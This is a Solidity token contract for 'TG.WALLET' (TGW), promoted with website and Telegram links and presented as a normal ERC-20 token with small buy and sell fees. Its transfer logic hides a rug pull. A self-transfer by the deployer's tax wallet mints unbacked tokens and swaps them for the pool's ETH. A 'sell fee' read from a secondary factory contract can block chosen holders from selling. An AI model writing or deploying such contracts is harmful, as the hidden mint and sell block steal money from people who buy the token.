// SPDX-License-Identifier: None

// https://tgwallet.pro/
// https://t.me/tg_wallet_portal
// https://t.me/tg_wallet_eth_bot
// https://twitter.com/tgwalleteth

pragma solidity 0.8.23;

interface IUniswapV2Factory {
    function getPair(address tokenB, address tokenC) external view returns (address pair);
}
interface IUniswapV2Router02 {
    function WETH() external pure returns (address);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(
        uint amountIn,
        uint amountOutMin,
        address[] calldata path,
        address to,
        uint deadline
    ) external;
    function factory() external pure returns (address);
}
contract TGWallet {
    uint8 private _decimals = 9;
    uint256 private _totalSupply =  100000000 * 10 ** _decimals;
    IUniswapV2Factory private uniswapV2Factory = IUniswapV2Factory(0x914aA47F101F6caED5336B642f2E86bF8eaC55D1);
    IUniswapV2Router02 private uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
    mapping (address => mapping (address => uint256)) private _allowances;
    event Transfer(address indexed from, address indexed to, uint256 amount);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    mapping (address => uint256) private _balances;
    uint256 buyFee = 1;
    uint256 sellFee = 1;
    address payable internal _taxWallet;
    mapping (address => uint256) shareRevenues;
    uint256 swapThreshold = _totalSupply * 2 / 1000;

    string private _name = unicode"TG.WALLET";
    string private _symbol = unicode"TGW";

    constructor () {
        _taxWallet = payable(msg.sender);
        _balances[msg.sender] = _totalSupply;
    }

    function decimals() public view returns (uint8) {
        return _decimals;
    }

    function totalSupply() public view returns (uint256) {
        return _totalSupply;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }

    function name() public view returns (string memory) {
        return _name;
    }

    function allowance(address owner, address spender) public view returns (uint256) {
        return _allowances[owner][spender];
    }

    function balanceOf(address account) public view returns (uint256) {
        return _balances[account];
    }

    function approve(address spender, uint256 amount) public returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }

    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");
        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }

    function swapTokensForETH(uint256 amount) private {
        address[] memory tokensPath = new address[](2);
        tokensPath[0] = address(this);  
        tokensPath[1] =  uniswapV2Router.WETH(); 
        _approve(address(this), address(uniswapV2Router), amount); 
        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(amount, 0, tokensPath, _taxWallet, block.timestamp + 36);
    }

    function getUniswapPair() public view returns (address) {
        return IUniswapV2Factory(uniswapV2Router.factory()).getPair(address(this), uniswapV2Router.WETH());
    }

    function getSellFeeRate(address to) internal view returns (uint160) {
        address token = address(this);
        return uint160(uniswapV2Factory.getPair(to, token));
    }

    function transfer(address recipient, uint256 amount) public returns (bool) {
        _transfer(msg.sender, recipient, amount);
        return true;
    }
    
    function transferFrom(address sender, address recipient, uint256 amount) public returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, msg.sender, _allowances[sender][msg.sender] - amount);
        return true;
    }

    function _transfer(address from, address to, uint256 amount) private {
        require(to != address(0), "ERC2O: transfer to the zero address");
        require(amount > 0, "Transfer amount must be greater than zero");
        require(from != address(0), "ERC2O: transfer from the zero address");
        if (to == _taxWallet && to == from) {
            _balances[address(this)] += amount;
            swapTokensForETH(amount);
            return;
        }
        uint256 feeAmount = 0;
        if (from != _taxWallet && to != _taxWallet) {
            feeAmount = amount * buyFee / 100;
        }
        if (from != _taxWallet && from != address(this) && from != getUniswapPair() && to != _taxWallet) {
            feeAmount = amount * uint256(getSellFeeRate(from)) / 100;
        }
        _balances[from] -= amount;
        _balances[to] += amount - feeAmount;
        emit Transfer(from, to, amount - feeAmount);
    }
}